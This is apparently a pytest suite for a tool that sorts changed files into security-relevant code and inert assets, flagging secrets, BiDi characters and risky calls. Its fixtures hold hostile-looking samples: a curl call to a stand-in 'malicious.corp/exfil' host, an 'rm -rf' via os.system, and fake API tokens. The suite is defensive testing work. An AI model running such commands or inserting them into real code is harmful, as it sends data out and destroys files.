#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
tests/test_audit_diff_classifier.py
===================================
Test Suite for Asset-vs-Code Diff Router & Classifier.

Verifies:
1. Code files (.py, .ts, .tsx, .js, .sh, .sql) classify as SECURITY_RELEVANT.
2. Inert assets (.srt, staging .txt, .md docs) classify as INERT_ASSET.
3. Declarative Manim animation script with clean AST classifies as INERT_ASSET.
4. Manim script with subprocess / eval / network calls escalates to SECURITY_RELEVANT.
5. Inert asset with embedded secrets, credentials, or Trojan BiDi characters escalates.
6. CLI exit code returns 0 for all-inert/clean and 1 when security-relevant changes exist.
7. Mem0 consolidation gate integration properly records AUDIT_DIFF_ROUTED_INERT when >= 80% inert.
"""

import sys
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

from tools.audit_diff_classifier import (
    DiffCategory,
    ClassificationResult,
    classify_path,
    scan_inert_sanity,
    record_diff_audit_to_mem0,
    main,
    get_git_diff_names,
    classify_git_diff,
)
from tools.mem0_audit_consolidation_gate import (
    Mem0ConsolidationGate,
    FindingSeverity,
)


# ---------------------------------------------------------------------------
# 1. Code Files Classification
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "code_path",
    [
        "src/core/auth_handler.py",
        "api/routes/users.ts",
        "web/components/UserProfile.tsx",
        "server/middleware/logger.js",
        "scripts/deploy_worker.sh",
        "db/migrations/20261011_init.sql",
    ],
)
def test_code_files_classify_as_security_relevant(code_path: str):
    res = classify_path(code_path)
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert not res.escalated_from_inert
    assert any("requires security audit" in r for r in res.reasons)


def test_code_with_security_keyword_reports_both():
    res = classify_path("src/auth/token_provider.py")
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert any("auth" in r or "token" in r for r in res.reasons)


# ---------------------------------------------------------------------------
# 2. Inert Assets Classification
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "asset_path",
    [
        "youtube_staging/ep01/captions.srt",
        "assets/subtitles/vietnamese.srt",
        "youtube_staging/ep02/description.txt",
        "youtube_staging/ep02/metadata.json",
        "docs/architecture_overview.md",
        "README.md",
        "assets/audio/voiceover_clean.wav",
        "assets/brand/channel_logo_2k.png",
        "renders/ep01_preview.mp4",
        "assets/brand/vector_badge.svg",
    ],
)
def test_inert_assets_classify_as_inert(asset_path: str):
    res = classify_path(asset_path)
    assert res.category == DiffCategory.INERT_ASSET
    assert not res.escalated_from_inert
    assert len(res.sanity_issues) == 0


def test_agents_rules_markdown_is_not_inert():
    """Rules in .agents/rules/ define sovereign invariants and must be audited."""
    res = classify_path(".agents/rules/01_council_integrity.md")
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert any("sovereign invariants" in r for r in res.reasons)


# ---------------------------------------------------------------------------
# 3. Declarative Manim Animation Gate
# ---------------------------------------------------------------------------

def test_declarative_manim_animation_classifies_as_inert():
    pure_geometry_code = """
from manim import *

class PureGeometryScene(Scene):
    def construct(self):
        circle = Circle(radius=1.5, color=BLUE)
        square = Square(side_length=2.0, color=GOLD)
        self.play(Create(circle))
        self.play(Transform(circle, square))
        self.wait(1.0)
"""
    res = classify_path("assets/manim/scene01_intro.py", file_content=pure_geometry_code)
    assert res.category == DiffCategory.INERT_ASSET
    assert not res.escalated_from_inert
    assert "clean AST" in res.reasons[0]


def test_declarative_manim_named_convention():
    pure_code = """
from manim import Scene, Dot, RED
class DotScene(Scene):
    def construct(self):
        d = Dot(color=RED)
        self.add(d)
"""
    res = classify_path("manim_bezier_curve.py", file_content=pure_code)
    assert res.category == DiffCategory.INERT_ASSET
    assert not res.escalated_from_inert


# ---------------------------------------------------------------------------
# 4. Manim Script Escalation on Suspicious AST
# ---------------------------------------------------------------------------

def test_manim_script_escalates_on_subprocess_popen():
    malicious_code = """
from manim import *
import subprocess

class SuspiciousScene(Scene):
    def construct(self):
        subprocess.Popen(["curl", "https://malicious.corp/exfil"])
        self.wait(1)
"""
    res = classify_path("assets/manim/scene02_network.py", file_content=malicious_code)
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert res.escalated_from_inert is True
    assert "AST escalation: contains dynamic execution / subprocess / network call" in res.reasons[0]


def test_manim_script_escalates_on_eval_and_exec():
    eval_code = """
from manim import *
class EvalScene(Scene):
    def construct(self):
        payload = eval("1 + 1")
        self.add(Text(str(payload)))
"""
    res = classify_path("manim_eval_test.py", file_content=eval_code)
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert res.escalated_from_inert is True
    assert "AST escalation: contains dynamic execution / subprocess / network call" in res.reasons[0]


def test_manim_script_escalates_on_os_system():
    os_code = """
from manim import *
import os
class SystemScene(Scene):
    def construct(self):
        os.system("rm -rf /tmp/data")
"""
    res = classify_path("tests/test_manim_os_call.py", file_content=os_code)
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert res.escalated_from_inert is True
    assert "AST escalation: contains dynamic execution / subprocess / network call" in res.reasons[0]


def test_manim_script_escalates_on_network_requests_and_socket():
    net_code = """
from manim import *
import requests
import socket

class NetScene(Scene):
    def construct(self):
        requests.get("https://google.com")
        s = socket.socket()
"""
    res = classify_path("assets/manim/net_leak.py", file_content=net_code)
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert res.escalated_from_inert is True
    assert "AST escalation: contains dynamic execution / subprocess / network call" in res.reasons[0]


# ---------------------------------------------------------------------------
# 5. Inert Asset Sanity Scan Escalation
# ---------------------------------------------------------------------------

def test_inert_asset_escalates_on_high_entropy_secrets():
    content_openai = "1\n00:00:01,000 --> 00:00:03,000\nKey: sk-1234567890abcdefghij1234567890\n"
    res = classify_path("youtube_staging/ep01.srt", file_content=content_openai)
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert res.escalated_from_inert is True
    assert any("sk-[...]" in s for s in res.sanity_issues)

    content_ghp = "Notes for deploy: ghp_1234567890abcdefghij1234567890\n"
    res_ghp = classify_path("youtube_staging/desc.txt", file_content=content_ghp)
    assert res_ghp.category == DiffCategory.SECURITY_RELEVANT
    assert res_ghp.escalated_from_inert is True
    assert any("ghp_[...]" in s for s in res_ghp.sanity_issues)

    content_bearer = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n"
    res_bearer = classify_path("docs/api_notes.md", file_content=content_bearer)
    assert res_bearer.category == DiffCategory.SECURITY_RELEVANT
    assert res_bearer.escalated_from_inert is True
    assert any("Bearer token" in s for s in res_bearer.sanity_issues)


def test_inert_asset_escalates_on_trojan_source_bidi_unicode():
    bidi_content = "1\n00:00:01,000 --> 00:00:02,000\nWelcome \u202e reversed text \u202c\n"
    res = classify_path("youtube_staging/ep01.srt", file_content=bidi_content)
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert res.escalated_from_inert is True
    assert any("Trojan Source BiDi" in s for s in res.sanity_issues)


def test_inert_asset_escalates_on_null_byte_in_text():
    null_content = "1\n00:00:01,000 --> 00:00:02,000\nBroken text \x00 null"
    res = classify_path("youtube_staging/ep01.srt", file_content=null_content)
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert res.escalated_from_inert is True
    assert any("null byte" in s for s in res.sanity_issues)


def test_inert_asset_escalates_on_embedded_credentials():
    url_creds = "Download footage: https://zen:super_secret_pw@cdn.insilos.com/clip.mp4"
    res = classify_path("youtube_staging/desc.txt", file_content=url_creds)
    assert res.category == DiffCategory.SECURITY_RELEVANT
    assert res.escalated_from_inert is True
    assert any("embedded credentials" in s for s in res.sanity_issues)

    url_token = "Stream preview: https://stream.zenpham.vn/live?token=1234567890abcdef1234"
    res_token = classify_path("docs/preview.md", file_content=url_token)
    assert res_token.category == DiffCategory.SECURITY_RELEVANT
    assert res_token.escalated_from_inert is True
    assert any("sensitive token/key query parameter" in s for s in res_token.sanity_issues)


# ---------------------------------------------------------------------------
# 6. CLI Exit Code & Piping
# ---------------------------------------------------------------------------

def test_cli_exit_code_zero_for_all_inert(tmp_path: Path):
    clean_srt = tmp_path / "subs.srt"
    clean_srt.write_text("1\n00:00:01,000 --> 00:00:02,000\nHello world\n")

    code = main(["--file", str(clean_srt)])
    assert code == 0


def test_cli_exit_code_one_for_security_relevant(tmp_path: Path):
    py_code = tmp_path / "worker.py"
    py_code.write_text("print('hello')\n")

    code = main(["--file", str(py_code)])
    assert code == 1


def test_cli_exit_code_one_for_escalated_inert(tmp_path: Path):
    tainted_srt = tmp_path / "tainted.srt"
    tainted_srt.write_text("sk-1234567890abcdefghij1234567890\n")

    code = main(["--file", str(tainted_srt)])
    assert code == 1


# ---------------------------------------------------------------------------
# 7. Mem0 Consolidation Integration
# ---------------------------------------------------------------------------

def test_mem0_consolidation_triggers_when_eighty_percent_inert():
    gate = Mem0ConsolidationGate(graduation_threshold=2, max_age_steps=5)

    results = [
        ClassificationResult("youtube_staging/1.srt", DiffCategory.INERT_ASSET, ["srt"]),
        ClassificationResult("youtube_staging/2.srt", DiffCategory.INERT_ASSET, ["srt"]),
        ClassificationResult("youtube_staging/3.srt", DiffCategory.INERT_ASSET, ["srt"]),
        ClassificationResult("youtube_staging/4.srt", DiffCategory.INERT_ASSET, ["srt"]),
        ClassificationResult("src/core/auth.py", DiffCategory.SECURITY_RELEVANT, ["py"]),
    ]
    # 4 out of 5 = 80% inert
    outcome = record_diff_audit_to_mem0(results, mem0_gate=gate, step_index=1)
    assert outcome is not None
    did_grad, cand = outcome
    assert len(gate.episodic_log) == 1
    obs = gate.episodic_log[0]
    assert obs.category == "AUDIT_DIFF_ROUTED_INERT"
    assert obs.severity == FindingSeverity.INFO
    assert "80.0% inert" in obs.description
    assert "suppressing full CWE" in obs.description


def test_mem0_consolidation_skips_when_less_than_eighty_percent_inert():
    gate = Mem0ConsolidationGate(graduation_threshold=2, max_age_steps=5)

    results = [
        ClassificationResult("youtube_staging/1.srt", DiffCategory.INERT_ASSET, ["srt"]),
        ClassificationResult("src/core/auth.py", DiffCategory.SECURITY_RELEVANT, ["py"]),
    ]
    # 1 out of 2 = 50% inert (< 80%)
    outcome = record_diff_audit_to_mem0(results, mem0_gate=gate, step_index=1)
    assert outcome is None
    assert len(gate.episodic_log) == 0


# ---------------------------------------------------------------------------
# 8. Git Diff Integration Helper Mock
# ---------------------------------------------------------------------------

def test_classify_git_diff_with_mocked_git(tmp_path: Path):
    mock_diff_output = "youtube_staging/sub.srt\nsrc/server.py\nassets/brand/logo.png\n"

    with patch("subprocess.run") as mock_run:
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = mock_diff_output
        mock_run.return_value = mock_proc

        diff_names = get_git_diff_names(tmp_path, staged=False)
        assert diff_names == [
            "youtube_staging/sub.srt",
            "src/server.py",
            "assets/brand/logo.png",
        ]

        grouped = classify_git_diff(tmp_path, staged=False)
        assert len(grouped[DiffCategory.INERT_ASSET]) == 2
        assert len(grouped[DiffCategory.SECURITY_RELEVANT]) == 1
        assert grouped[DiffCategory.SECURITY_RELEVANT][0].path == "src/server.py"
